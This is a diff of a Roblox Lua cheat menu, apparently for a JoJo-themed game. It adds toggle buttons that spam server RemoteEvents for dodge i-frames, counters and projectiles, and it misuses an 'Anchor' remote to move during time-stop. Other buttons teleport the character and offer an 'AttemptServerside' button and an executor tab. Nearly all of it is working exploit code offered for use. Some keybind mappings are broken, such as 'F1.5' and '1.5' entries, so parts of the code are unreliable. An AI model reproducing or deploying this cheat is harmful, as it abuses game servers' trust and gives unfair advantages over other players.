+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.H"
+		elseif text == "i" or text == "I" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.I"
+		elseif text == "j" or text == "J" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.J"
+		elseif text == "k" or text == "K" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.K"
+		elseif text == "l" or text == "L" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.L"
+		elseif text == "m" or text == "M" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.M"
+		elseif text == "n" or text == "N" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.N"
+		elseif text == "o" or text == "O" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.O"
+		elseif text == "p" or text == "P" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.P"
+		elseif text == "q" or text == "Q" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Q"
+		elseif text == "r" or text == "R" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.R"
+		elseif text == "t" or text == "T" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.T"
+		elseif text == "u" or text == "U" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.U"
+		elseif text == "v" or text == "V" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.V"
+		elseif text == "x" or text == "X" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.X"
+		elseif text == "y" or text == "Y" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Y"
+		elseif text == "z" or text == "Z" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Z"
+		elseif text == "1" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.One"
+		elseif text == "2" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Two"
+		elseif text == "3" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Three"
+		elseif text == "4" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Four"
+		elseif text == "5" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Five"
+		elseif text == "6" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Six"
+		elseif text == "7" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Seven"
+		elseif text == "8" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Eight"
+		elseif text == "9" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Nine"
+		elseif text == "0" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Zero"
+		elseif text == "F1" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F1"
+		elseif text == "F2" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F2"
+		elseif text == "F3" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F3"
+		elseif text == "F4" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F4"
+		elseif text == "F5" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F5"
+		elseif text == "F6" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F6"
+		elseif text == "F7" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F7"
+		elseif text == "F8" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F8"
+		elseif text == "F9" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F9"
+		elseif text == "F10" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F10"
+		elseif text == "F11" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F11"
+		elseif text == "F12" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F12"
+		end
+	end
+	
+	
+end
+coroutine.wrap(KBXRNS_fake_script)()
+local function IOSYY_fake_script() -- OniIFramesButton.ButtonManager 
+	local script = Instance.new('LocalScript', OniIFramesButton)
+
+	local ESB = script.Parent
+	local on = false
+	local off = true
+	local UIS = game:GetService("UserInputService")
+	
+	ESB.Activated:Connect(function()
+		if off == true then
+			on = true
+			off = false
+			print("ONI IFRAMES ON")
+			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
+			while on == true do
+				wait()
+				local args = {
+					"Alternate",
+					"Dodge"
+				}
+				game:GetService("ReplicatedStorage"):WaitForChild("Main"):WaitForChild("Input"):FireServer(unpack(args))
+			end
+		elseif on == true then
+			on = false
+			off = true
+			print("ONI IFRAMES OFF")
+			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
+		end
+	end)
+	
+end
+coroutine.wrap(IOSYY_fake_script)()
+local function HEGOWR_fake_script() -- EpiWarningButton.ButtonManager 
+	local script = Instance.new('LocalScript', EpiWarningButton)
+
+	local ESB = script.Parent
+	local on = false
+	local off = true
+	local toggleConnection
+	local UIS = game:GetService("UserInputService")
+	
+	ESB.Activated:Connect(function()
+		if off == true then
+			on = true
+			off = false
+			print("EPITAPH WARNING ON")
+			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
+	while on == true do
+		wait()
+				local Players = game:GetService("Players")
+	
+				-- Function to create a BillboardGui
+				local function createBillboardGui(character)
+					local head = character:WaitForChild("Head")
+	
+					-- Create BillboardGui
+					local billboardGui = Instance.new("BillboardGui")
+					billboardGui.Adornee = head
+					billboardGui.Size = UDim2.new(0, 100, 0, 50)
+					billboardGui.StudsOffset = Vector3.new(0, 2, 0) -- Offset above the head
+	
+					-- Create TextLabel
+					local textLabel = Instance.new("TextLabel")
+					textLabel.Size = UDim2.new(1, 0, 1, 0)
+					textLabel.BackgroundTransparency = 1
+					textLabel.TextColor3 = Color3.new(1, 1, 1) -- White text
+					textLabel.TextScaled = true
+					textLabel.Name = "TextLabel" -- Name the TextLabel for easy access
+	
+					-- Parent the TextLabel to the BillboardGui
+					textLabel.Parent = billboardGui
+					billboardGui.Parent = head
+	
+					-- Update the text based on the Epitaphing value
+					local epitaphing = character:FindFirstChild("Epitaphing")
+					if epitaphing and epitaphing:IsA("BoolValue") then
+						textLabel.Text = "Epitaphing: " .. tostring(epitaphing.Value)
+	
+						-- Update the text when the Epitaphing value changes
+						epitaphing:GetPropertyChangedSignal("Value"):Connect(function()
+							textLabel.Text = "Epitaphing: " .. tostring(epitaphing.Value)
+						end)
+					else
+						textLabel.Text = "Epitaphing: false" -- Default if Epitaphing doesn't exist or is not a BoolValue
+					end
+				end
+	
+				-- Function to handle character added
+				local function onCharacterAdded(player)
+					player.CharacterAdded:Connect(function(character)
+						wait(1) -- Wait for the character to fully load
+						createBillboardGui(character)
+					end)
+				end
+	
+				-- Iterate through all players currently in the game
+				for _, player in ipairs(Players:GetChildren()) do
+					if player:IsA("Player") then
+						onCharacterAdded(player)
+						if player.Character then
+							createBillboardGui(player.Character)
+						end
+					end
+				end
+	
+				-- Connect to PlayerAdded event to check when players join
+				Players.PlayerAdded:Connect(function(player)
+					onCharacterAdded(player)
+				end)
+	end
+		elseif on == true then
+			on = false
+			off = true
+			print("EPITAPH WARNING OFF")
+			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
+		end
+	end)
+	
+end
+coroutine.wrap(HEGOWR_fake_script)()
+local function TICITT_fake_script() -- ESplashButton.ButtonManager 
+	local script = Instance.new('LocalScript', ESplashButton)
+
+	local ESB = script.Parent
+	local on = false
+	local off = true
+	local UIS = game:GetService("UserInputService")
+	local KEYBIND = script.Parent.Parent.TextLabel.Keybind.Text
+	
+	local function getKeyCodeFromString(keyString)
+		local keyName = keyString:match("Enum%.KeyCode%.(.+)")
+		if keyName then
+			local keyCode = Enum.KeyCode[keyName]
+			if keyCode then
+				return keyCode
+			else
+				error(keyName .. " is not a valid KeyCode")
+			end
+		else
+			error("Keybind format is incorrect. Please use 'Enum.KeyCode.<KeyName>'")
+		end
+	end
+	
+	while not KEYBIND:match("Enum%.KeyCode%.") do
+		wait(0.1)
+		KEYBIND = script.Parent.Parent.TextLabel.Keybind.Text
+	end
+	
+	local keyCode = getKeyCodeFromString(KEYBIND)
+	
+	ESB.Activated:Connect(function()
+		if off == true then
+			on = true
+			off = false
+			print("EMERALD SPLASH ON")
+			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
+	
+			while on == true do
+				wait()
+				UIS.InputBegan:Connect(function(ip, gpe)
+					if ip.KeyCode == keyCode then
 						local args = {
 							[1] = "Alternate",
 							[2] = "EmeraldProjectile2",
@@ -1873,15 +3129,9 @@ local function LUSIJ_fake_script() -- ESplashButton_3.ButtonManager
 							[4] = game.Players.LocalPlayer:GetMouse().Hit
 						}
 						game:GetService("ReplicatedStorage"):WaitForChild("Main"):WaitForChild("Input"):FireServer(unpack(args))
-					end
-					if ip.KeyCode == Enum.KeyCode.K then
-						local hiloop = true
-						while hiloop == true do
-							wait()
-							game.Workspace:WaitForChild("Effects"):ClearAllChildren()
-							wait(1)
-							hiloop = false
-						end
+	
+						wait(0.75)
+						game.Workspace:WaitForChild("Effects"):ClearAllChildren()
 					end
 				end)
 			end
@@ -1894,8 +3144,157 @@ local function LUSIJ_fake_script() -- ESplashButton_3.ButtonManager
 	end)
 	
 end
-coroutine.wrap(LUSIJ_fake_script)()
-local function GIJSW_fake_script() -- SpamSoundsButton.ButtonManager 
+coroutine.wrap(TICITT_fake_script)()
+local function QLNYE_fake_script() -- Keybind_3.ReturnToOrigin 
+	local script = Instance.new('LocalScript', Keybind_3)
+
+	local textBox = script.Parent
+	
+	while wait() do
+		local text = textBox.Text
+	
+		if text == "" then
+			wait(1.5)
+			textBox.Text = "Keybind here."
+		elseif text == "b" or text == "B" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.B"
+		elseif text == "c" or text == "C" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.C"
+		elseif text == "e" or text == "E" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.E"
+		elseif text == "f" or text == "F" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F"
+		elseif text == "g" or text == "G" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.G"
+		elseif text == "h" or text == "H" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.H"
+		elseif text == "i" or text == "I" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.I"
+		elseif text == "j" or text == "J" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.J"
+		elseif text == "k" or text == "K" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.K"
+		elseif text == "l" or text == "L" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.L"
+		elseif text == "m" or text == "M" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.M"
+		elseif text == "n" or text == "N" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.N"
+		elseif text == "o" or text == "O" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.O"
+		elseif text == "p" or text == "P" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.P"
+		elseif text == "q" or text == "Q" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Q"
+		elseif text == "r" or text == "R" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.R"
+		elseif text == "t" or text == "T" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.T"
+		elseif text == "u" or text == "U" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.U"
+		elseif text == "v" or text == "V" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.V"
+		elseif text == "x" or text == "X" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.X"
+		elseif text == "y" or text == "Y" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Y"
+		elseif text == "z" or text == "Z" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Z"
+		elseif text == "1.5" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.One"
+		elseif text == "2" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Two"
+		elseif text == "3" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Three"
+		elseif text == "4" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Four"
+		elseif text == "5" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Five"
+		elseif text == "6" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Six"
+		elseif text == "7" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Seven"
+		elseif text == "8" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Eight"
+		elseif text == "9" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Nine"
+		elseif text == "0" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.Zero"
+		elseif text == "F1.5" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F1.5"
+		elseif text == "F2" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F2"
+		elseif text == "F3" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F3"
+		elseif text == "F4" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F4"
+		elseif text == "F5" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F5"
+		elseif text == "F6" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F6"
+		elseif text == "F7" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F7"
+		elseif text == "F8" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F8"
+		elseif text == "F9" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F9"
+		elseif text == "F10" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F10"
+		elseif text == "F11" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F11"
+		elseif text == "F12" then
+			wait(1.5)
+			textBox.Text = "Enum.KeyCode.F12"
+		end
+	end
+	
+	
+end
+coroutine.wrap(QLNYE_fake_script)()
+local function URSD_fake_script() -- SpamSoundsButton.ButtonManager 
 	local script = Instance.new('LocalScript', SpamSoundsButton)
 
 	local ESB = script.Parent
@@ -1946,9 +3345,211 @@ local function GIJSW_fake_script() -- SpamSoundsButton.ButtonManager
 	end)
 	
 end
-coroutine.wrap(GIJSW_fake_script)()
-local function DQZPQ_fake_script() -- SpamSoundsButton_2.ButtonManager 
-	local script = Instance.new('LocalScript', SpamSoundsButton_2)
+coroutine.wrap(URSD_fake_script)()
+local function ZHLUD_fake_script() -- TSMovementButton.ButtonManager 
+	local script = Instance.new('LocalScript', TSMovementButton)
+
+	local ESB = script.Parent
+	local on = false
+	local off = true
+	local toggleConnection
+	local UIS = game:GetService("UserInputService")
+	
+	local function collectParts(parent)
+		local parts = {}
+		for _, child in ipairs(parent:GetChildren()) do
+			if child:IsA("BasePart") then
+				table.insert(parts, child)
+			end
+			for _, grandChild in ipairs(child:GetChildren()) do
+				if grandChild:IsA("BasePart") then
+					table.insert(parts, grandChild)
+				end
+			end
+		end
+		return parts
+	end
+	
+	local function anchorParts(parts, anchor)
+		for _, part in ipairs(parts) do
+			game:GetService("ReplicatedStorage"):WaitForChild("Anchor"):FireServer(part, anchor)
+		end
+	end
+	
+	local function toggleMovementLoop()
+		while on do
+			local player = game:GetService("Players").LocalPlayer
+			if player and player.Character then
+				local character = player.Character
+				local partsToToggle = collectParts(character)
+				anchorParts(partsToToggle, false)
+	
+				local stand = character:FindFirstChild("Stand")
+				if stand then
+					local standPartsToToggle = collectParts(stand)
+					anchorParts(standPartsToToggle, false)
+				else
+					warn("Stand object not found in character")
+				end
+			else
+				warn("Character not found for LocalPlayer")
+			end
+			wait(1)
+		end
+	end
+	
+	ESB.Activated:Connect(function()
+		if off then
+			on = true
+			off = false
+			print("TS MOVEMENT ON")
+			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
+	
+			if toggleConnection then
+				toggleConnection:Disconnect()
+			end
+			toggleConnection = coroutine.create(toggleMovementLoop)
+			coroutine.resume(toggleConnection)
+	
+		elseif on then
+			on = false
+			off = true
+			print("TS MOVEMENT OFF")
+			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
+	
+			if toggleConnection then
+				toggleConnection:Disconnect()
+			end
+			local player = game:GetService("Players").LocalPlayer
+			if player and player.Character then
+				local character = player.Character
+				local partsToToggle = collectParts(character)
+				anchorParts(partsToToggle, true)
+	
+				local stand = character:FindFirstChild("Stand")
+				if stand then
+					local standPartsToToggle = collectParts(stand)
+					anchorParts(standPartsToToggle, true)
+				else
+					warn("Stand object not found in character")
+				end
+			else
+				warn("Character not found for LocalPlayer")
+			end
+		end
+	end)
+	
+end
+coroutine.wrap(ZHLUD_fake_script)()
+local function XCHVD_fake_script() -- SpinDashButton.ButtonManager 
+	local script = Instance.new('LocalScript', SpinDashButton)
+
+	local on = false
+	local off = true
+	local ESB = script.Parent
+	
+	ESB.Activated:Connect(function()
+		if off == true then
+			on = true	
+			local UserInputService = game:GetService("UserInputService")
+			off = false
+			print("SPIN DASH ON")
+			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
+			while on == true do
+			local Debris = game:GetService("Debris")
+			local player = game.Players.LocalPlayer
+			local character = player.Character or player.CharacterAdded:Wait()
+			local Humanoid = character:WaitForChild("Humanoid")
+			local Stand = character:WaitForChild("Stand")
+			local StandRoot = Stand:WaitForChild("StandHumanoidRootPart")
+	
+			local Animations, Sounds = {}, {}
+	
+			-- Load animations and sounds from StandRoot
+			for _, obj in ipairs(StandRoot:GetChildren()) do
+				if obj:IsA("Animation") then
+					Animations[obj.Name] = Humanoid:LoadAnimation(obj)
+				elseif obj:IsA("Sound") then
+					Sounds[obj.Name] = obj
+				end
+			end
+	
+			local function playAnim(animationName)
+				if Animations[animationName] then
+					Animations[animationName]:Play()
+				end
+			end
+	
+			local function playSound(soundName)
+				if Sounds[soundName] then
+					Sounds[soundName]:Play()
+				end
+			end
+	
+			local function dodge()
+				playAnim("Roll")  -- Assuming "Roll" is the name of the animation
+				playSound("Dodge")  -- Assuming "Dodge" is the name of the sound
+	
+				local velocity = Instance.new("BodyVelocity")
+				velocity.MaxForce = Vector3.new(1e5, 0, 1e5)
+				velocity.Velocity = character.HumanoidRootPart.CFrame.LookVector * 50
+				velocity.Parent = character.HumanoidRootPart
+				Debris:AddItem(velocity, 0.25)
+			end
+	
+			UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
+				if not gameProcessedEvent then
+					if input.KeyCode == Enum.KeyCode.C then
+						dodge()
+					end
+				end
+			end)
+			end
+			
+		elseif on == true then
+			on = false
+			off = true
+			print("SPIN DASH OFF")
+			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
+		end
+	end)
+end
+coroutine.wrap(XCHVD_fake_script)()
+local function USXEN_fake_script() -- StandlessCounterButton.ButtonManager 
+	local script = Instance.new('LocalScript', StandlessCounterButton)
+
+	local ESB = script.Parent
+	local on = false
+	local off = true
+	local toggleConnection
+	local UIS = game:GetService("UserInputService")
+	
+	ESB.Activated:Connect(function()
+		if off == true then
+			on = true
+			off = false
+			print("STANDLESS COUTNER ON")
+			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
+		while on == true do
+			wait()
+				local args = {
+					"Alternate",
+					"Counter"
+				}
+				game:GetService("ReplicatedStorage"):WaitForChild("Main"):WaitForChild("Input"):FireServer(unpack(args))
+		end
+		elseif on == true then
+			on = false
+			off = true
+			print("STANDLESS COUNTER OFF")
+			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
+		end
+	end)
+	
+end
+coroutine.wrap(USXEN_fake_script)()
+local function BZXA_fake_script() -- VTW1TapsButton.ButtonManager 
+	local script = Instance.new('LocalScript', VTW1TapsButton)
 
 	local ESB = script.Parent
 	local on = false
@@ -1959,65 +3560,112 @@ local function DQZPQ_fake_script() -- SpamSoundsButton_2.ButtonManager
 		if off == true then
 			on = true
 			off = false
-			print("TS MOVEMENT ON")
-			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"		
-			local player = game.Players.LocalPlayer
-			local function unanchorParts(character)
-				if character then
-					for _, part in pairs(character:GetDescendants()) do
-						if part:IsA("BasePart") then
-							if part.Anchored == true then
-								part.Anchored = false
-							end
-						end
-					end
-				end
-			end
-			while on == true do
-				local character = player.Character
-				if character then
-					local stand = character:FindFirstChild("Stand")
-					if stand then
-						unanchorParts(character)
-						unanchorParts(stand)
-					end
-				end
-	
-				task.wait(0.1)
-			end
-		elseif on == true then
-			on = false
-			off = true
-			print("TS MOVEMENT OFF")
-			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
-		end
-	end)
-	
-end
-coroutine.wrap(DQZPQ_fake_script)()
-local function KZIV_fake_script() -- ESplashButton_4.ButtonManager 
-	local script = Instance.new('LocalScript', ESplashButton_4)
-
-	local on = false
-	local off = true
-	local ESB = script.Parent
-	
-	ESB.Activated:Connect(function()
-		if off == true then
-			on = true
-			off = false
-			print("EMERALD SPLASH ON")
+			print("1 TAP VTW ON")
 			ESB.Image = "http://www.roblox.com/asset/?id=6670322349"
+			while on == true do
+				local UserInputService = game:GetService("UserInputService")
+				local Players = game:GetService("Players")
+				local player = Players.LocalPlayer
+				local character = player.Character or player.CharacterAdded:Wait()
+				local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+	
+				local function onKeyPress(input, gameProcessedEvent)
+					if gameProcessedEvent then return end
+	
+					if input.KeyCode == Enum.KeyCode.N then
+						-- Create TP1Loc at the player's current location
+						local TP1Loc = Instance.new("Part")
+						TP1Loc.Size = Vector3.new(4, 1, 4) -- Size of the part
+						TP1Loc.Position = humanoidRootPart.Position
+						TP1Loc.Anchored = true
+						TP1Loc.CanCollide = false
+						TP1Loc.BrickColor = BrickColor.new("Black")
+						TP1Loc.Transparency = 0.5 -- Half invisible
+						TP1Loc.Name = "TP1Loc"
+						TP1Loc.Parent = workspace
+	
+						-- Create TP2Loc at the specified coordinates
+						local TP2Loc = Instance.new("Part")
+						TP2Loc.Size = Vector3.new(4, 1, 4) -- Size of the part
+						TP2Loc.Position = Vector3.new(2116, 740, -519) -- Updated coordinates
+						TP2Loc.Anchored = true
+						TP2Loc.CanCollide = true -- Collision enabled so the player can stand on it
+						TP2Loc.BrickColor = BrickColor.new("Black")
+						TP2Loc.Transparency = 0.5 -- Half invisible
+						TP2Loc.Name = "TP2Loc"
+						TP2Loc.Parent = workspace
+	
+						-- Wait 1.5 seconds
+						wait(1.5)
+	
+						-- Teleport to 10 studs above TP2Loc
+						humanoidRootPart.Position = TP2Loc.Position + Vector3.new(0, 10, 0)
+	
+						-- Wait another 1.5 seconds
+						wait(1.5)
+	
+						-- Teleport back to 10 studs above TP1Loc
+						humanoidRootPart.Position = TP1Loc.Position + Vector3.new(0, 10, 0)
+	
+						-- Destroy both parts
+						TP1Loc:Destroy()
+						TP2Loc:Destroy()
+	
+					elseif input.KeyCode == Enum.KeyCode.J then
+						-- Create TP1LocJ at the player's current location
+						local TP1LocJ = Instance.new("Part")
+						TP1LocJ.Size = Vector3.new(4, 1, 4) -- Size of the part
+						TP1LocJ.Position = humanoidRootPart.Position
+						TP1LocJ.Anchored = true
+						TP1LocJ.CanCollide = false
+						TP1LocJ.BrickColor = BrickColor.new("Black")
+						TP1LocJ.Transparency = 0.5 -- Half invisible
+						TP1LocJ.Name = "TP1LocJ"
+						TP1LocJ.Parent = workspace
+	
+						-- Create TP2LocJ at the specified coordinates
+						local TP2LocJ = Instance.new("Part")
+						TP2LocJ.Size = Vector3.new(4, 1, 4) -- Size of the part
+						TP2LocJ.Position = Vector3.new(2116, 740, -519) -- Updated coordinates
+						TP2LocJ.Anchored = true
+						TP2LocJ.CanCollide = true -- Collision enabled so the player can stand on it
+						TP2LocJ.BrickColor = BrickColor.new("Black")
+						TP2LocJ.Transparency = 0.5 -- Half invisible
+						TP2LocJ.Name = "TP2LocJ"
+						TP2LocJ.Parent = workspace
+	
+						-- Wait 1.5 seconds
+						wait(1.5)
+	
+						-- Teleport to 10 studs above TP2LocJ
+						humanoidRootPart.Position = TP2LocJ.Position + Vector3.new(0, 10, 0)
+	
+						-- Wait another 1.5 seconds
+						wait(1.5)
+	
+						-- Wait 7 seconds before teleporting back
+						wait(7)
+						humanoidRootPart.Position = TP1LocJ.Position + Vector3.new(0, 10, 0)
+	
+						-- Destroy both parts
+						TP1LocJ:Destroy()
+						TP2LocJ:Destroy()
+					end
+				end
+	
+				UserInputService.InputBegan:Connect(onKeyPress)
+			end
 		elseif on == true then
 			on = false
 			off = true
-			print("EMERALD SPLASH OFF")
+			print("1 TAP VTW OFF")
 			ESB.Image = "http://www.roblox.com/asset/?id=107075188558816"
 		end
 	end)
+	
 end
-coroutine.wrap(KZIV_fake_script)()
-local function AISL_fake_script() -- ReduceLag.ReduceLag 
+coroutine.wrap(BZXA_fake_script)()
+local function WTJAXK_fake_script() -- ReduceLag.ReduceLag 
 	local script = Instance.new('LocalScript', ReduceLag)
 
 	script.Parent.Activated:Connect(function()
@@ -2044,8 +3692,8 @@ local function AISL_fake_script() -- ReduceLag.ReduceLag
 	end)
 	
 end
-coroutine.wrap(AISL_fake_script)()
-local function WHOE_fake_script() -- DeleteFire.DeleteFire 
+coroutine.wrap(WTJAXK_fake_script)()
+local function JFAW_fake_script() -- DeleteFire.DeleteFire 
 	local script = Instance.new('LocalScript', DeleteFire)
 
 	script.Parent.Activated:Connect(function()
@@ -2054,8 +3702,8 @@ local function WHOE_fake_script() -- DeleteFire.DeleteFire
 	end)
 	
 end
-coroutine.wrap(WHOE_fake_script)()
-local function DRJXJWT_fake_script() -- AttemptServerside.AttemptServerside 
+coroutine.wrap(JFAW_fake_script)()
+local function YSOI_fake_script() -- AttemptServerside.AttemptServerside 
 	local script = Instance.new('LocalScript', AttemptServerside)
 
 	script.Parent.Activated:Connect(function()
@@ -2064,73 +3712,82 @@ local function DRJXJWT_fake_script() -- AttemptServerside.AttemptServerside
 		end
 	end)
 end
-coroutine.wrap(DRJXJWT_fake_script)()
-local function ZJJGAAM_fake_script() -- RespawnSameSpot.RespawnSameSpot 
+coroutine.wrap(YSOI_fake_script)()
+local function QREVMU_fake_script() -- RespawnSameSpot.RespawnSameSpot 
 	local script = Instance.new('LocalScript', RespawnSameSpot)
 
 	local vals = false
 	script.Parent.Activated:Connect(function()
 		if vals == true then
 			vals = false
-		elseif vals == false then
+		else
 			vals = true
 		end
-	while vals == true do
-		local RunService = game:GetService("RunService")
-		local LocalPlayer = game.Players.LocalPlayer
-		local function getHum()
-			if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
-				return LocalPlayer.Character:FindFirstChild("Humanoid")
-			end
-			return nil
-		end
-		local function getRoot(char)
-			if char and char:FindFirstChild("HumanoidRootPart") then
-				return char:FindFirstChild("HumanoidRootPart")
-			end
-			return nil
-		end
-		local function getTorso(char)
-			if char then
-				if char:FindFirstChild("Torso") then
-					return char:FindFirstChild("Torso")
-				elseif char:FindFirstChild("UpperTorso") then
-					return char:FindFirstChild("UpperTorso")
-				end
-			end
-			return nil
-		end
-		local deathConnection
-		local function handleDeath()
-			local humanoid = getHum()
-			if humanoid and humanoid.Health == 0 then
-				local char = LocalPlayer.Character
-				local torso = getTorso(char)
-				local rootPart = getRoot(char)
+		while vals == true do
+			local LocalPlayer = game.Players.LocalPlayer
+			local isHandlingDeath = false
 	
-				if torso and rootPart then
-					local torsoCFrame = torso.CFrame
-					task.wait(3.5)
-					if rootPart then
-						rootPart.CFrame = torsoCFrame
+			local function getHum() 
+				return LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") 
+			end
+	
+			local function getRoot(char) 
+				return char and char:FindFirstChild("HumanoidRootPart") 
+			end
+	
+			local function getTorso(char) 
+				return char and (char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")) 
+			end
+	
+			local function handleDeath()
+				if isHandlingDeath then return end
+				isHandlingDeath = true
+	
+				local humanoid = getHum()
+				if humanoid and humanoid.Health == 0 then
+					local char = LocalPlayer.Character
+					local torso = getTorso(char)
+					local rootPart = getRoot(char)
+	
+					if torso and rootPart then
+						local TPPart1 = Instance.new("Part")
+						TPPart1.Size = Vector3.new(1, 1, 1)
+						TPPart1.Position = torso.Position
+						TPPart1.Anchored = true
+						TPPart1.CanCollide = false
+						TPPart1.Transparency = 1
+						TPPart1.Name = "TPPart1"
+						TPPart1.Parent = workspace
+	
+						LocalPlayer.CharacterAdded:Wait()
+						task.wait(1.5)
+	
+						if rootPart then
+							rootPart.CFrame = TPPart1.CFrame
+						end
+	
+						TPPart1:Destroy()
 					end
 				end
+	
+				isHandlingDeath = false
 			end
-		end
-		local function onCharacterAdded(character)
-			local humanoid = getHum()
-			if humanoid then
-				humanoid.Died:Connect(function()
-					handleDeath()
-				end)
+	
+			local function onCharacterAdded(character)
+				local humanoid = getHum()
+				if humanoid then
+					humanoid.Died:Connect(handleDeath)
+				end
 			end
-		end
-		LocalPlayer.CharacterAdded:Connect(onCharacterAdded)
+	
+			LocalPlayer.CharacterAdded:Connect(onCharacterAdded)
 		end
 	end)
+	
+	
 end
-coroutine.wrap(ZJJGAAM_fake_script)()
-local function TNYVG_fake_script() -- Settings_2.Settings 
+coroutine.wrap(QREVMU_fake_script)()
+local function IOFXL_fake_script() -- Settings_2.Settings 
 	local script = Instance.new('LocalScript', Settings_2)
 
 	script.Parent.Activated:Connect(function()
@@ -2147,16 +3804,16 @@ local function TNYVG_fake_script() -- Settings_2.Settings
 		tabs.Executor.Visible = false
 	end)
 end
-coroutine.wrap(TNYVG_fake_script)()
-local function STMTU_fake_script() -- Close.Exit 
+coroutine.wrap(IOFXL_fake_script)()
+local function GYJKJGQ_fake_script() -- Close.Exit 
 	local script = Instance.new('LocalScript', Close)
 
 	script.Parent.Activated:Connect(function()
